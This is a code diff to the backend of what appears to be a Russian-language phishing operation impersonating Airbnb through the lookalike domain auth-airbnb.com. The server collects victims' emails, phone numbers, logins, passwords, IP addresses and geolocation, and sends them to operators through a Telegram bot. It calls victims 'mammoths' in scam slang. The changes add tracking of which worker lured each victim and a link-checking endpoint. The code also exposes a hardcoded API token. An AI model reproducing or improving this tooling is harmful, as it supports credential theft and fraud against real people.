@@ -81,9 +81,9 @@ const generateMessage = flow => {
 	console.log(flow);
 	io.to('support').emit('flows', { ip: flow.ip, flows: flows.filter(f => f.ip === flow.ip && f.isActive) });
 	return [
-		`${flow.isActive ? '🟩 Мамонт активен!' : '🦣 Мамонт не активен'}\n\n💠 ID: ${flow.id}\n👤 Обрабатывает: @${flow.whoHandles ?? null}\n🌏 IP: ${flow.ip}\n🇺🇸 GEO: ${
-			flow.geo
-		}\nЧат: https://auth-airbnb.com/support/penis?con=${flow.ip}\n\nСпособ авторизации: ${flow.method}\n${
+		`${flow.isActive ? '🟩 Мамонт активен!' : '🦣 Мамонт не активен'}\n\n💠 ID: ${flow.id}\n🎖 Завел: ${flow.link ?? null}\n👤 Обрабатывает: @${flow.whoHandles ?? null}\n🌏 IP: ${
+			flow.ip
+		}\n🇺🇸 GEO: ${flow.geo}\nЧат: https://auth-airbnb.com/support/penis?con=${flow.ip}\n\nСпособ авторизации: ${flow.method}\n${
 			flow.method === 'email' && flow.email
 				? `Email: <code>${flow.email}</code>\n`
 				: flow.method === 'phone' && flow.phone
@@ -189,7 +189,7 @@ io.on('connection', async socket => {
 		});
 		if (flowIsRequired) return;
 
-		const ipInfo = await axios // PROD: ${data.ip}
+		const ipInfo = await axios
 			.get(`https://ipinfo.io/${ip}?token=24eac7842fafa4`)
 			.then(res => res.data)
 			.catch(e => e.response.data);
@@ -212,6 +212,7 @@ io.on('connection', async socket => {
 					phone: data.phone ?? null,
 					email: data.email ?? null,
 					login: data.login ?? null,
+					link: data.link,
 					ip: ipInfo.ip,
 					geo: geo,
 					description: data.email || data.login ? 'Ожидаем пароль от мамонта' : 'Мамонт ждет запроса кода',
@@ -226,6 +227,7 @@ io.on('connection', async socket => {
 				phone: data.phone ?? null,
 				email: data.email ?? null,
 				login: data.login ?? null,
+				link: data.link,
 				ip: ipInfo.ip,
 				geo: geo,
 				socketId: socket.id,
@@ -305,7 +307,7 @@ io.on('connection', async socket => {
 						CH2ID,
 						con.messageId,
 						null,
-						`⬛️ IP: <b>${ip}</b>\nGEO: ${geo}\nBrowser: <code>${con?.agent?.browser?.name}</code>\nDevice: <code>${con?.agent?.device?.vendor}</code>\nOS: <code>${
+						`⬛️ IP: <b>${ip}</b>\nGEO: ${con.geo}\nBrowser: <code>${con?.agent?.browser?.name}</code>\nDevice: <code>${con?.agent?.device?.vendor}</code>\nOS: <code>${
 							con?.agent?.os?.name
 						}</code>\nTime: <code>${((Date.now() - con.ts) / 1000).toFixed(0)} sec.</code>`,
 						{ parse_mode: 'HTML' }
@@ -330,7 +332,7 @@ io.on('connection', async socket => {
 	try {
 		const parser = new UAParser(socket.handshake.headers['user-agent']);
 		const userAgent = parser.getResult();
-		const ipInfo = await axios // PROD: ${data.ip}
+		const ipInfo = await axios
 			.get(`https://ipinfo.io/${ip}?token=24eac7842fafa4`)
 			.then(res => res.data)
 			.catch(e => e.response.data);
@@ -369,7 +371,7 @@ bot.action('disconnect', async ctx => {
 					CH2ID,
 					con.messageId,
 					null,
-					`⬛️ IP: <b>${con.ip}</b>\nGEO: ${geo}\nBrowser: <code>${con?.agent?.browser?.name}</code>\nDevice: <code>${con?.agent?.device?.vendor}</code>\nOS: <code>${
+					`⬛️ IP: <b>${con.ip}</b>\nGEO: ${con.geo}\nBrowser: <code>${con?.agent?.browser?.name}</code>\nDevice: <code>${con?.agent?.device?.vendor}</code>\nOS: <code>${
 						con?.agent?.os?.name
 					}</code>\nTime: <code>${(Date.now() - con.ts) / 1000} sec.</code>`,
 					{ parse_mode: 'HTML' }
@@ -491,6 +493,15 @@ app.post('/api/method', async (req, res) => {
 	}
 });
 
+app.post('/api/link', async (req, res) => {
+	try {
+		if (links[req.body.link]) res.send(true);
+		else res.send(false);
+	} catch (error) {
+		res.send(false);
+	}
+});
+
 // COMMANDS
 
 bot.command('pn', async ctx => {
@@ -578,3 +589,4 @@ bot.command('pc', async ctx => {
 
 bot.launch();
 io.listen(4545);
+app.listen(4646);
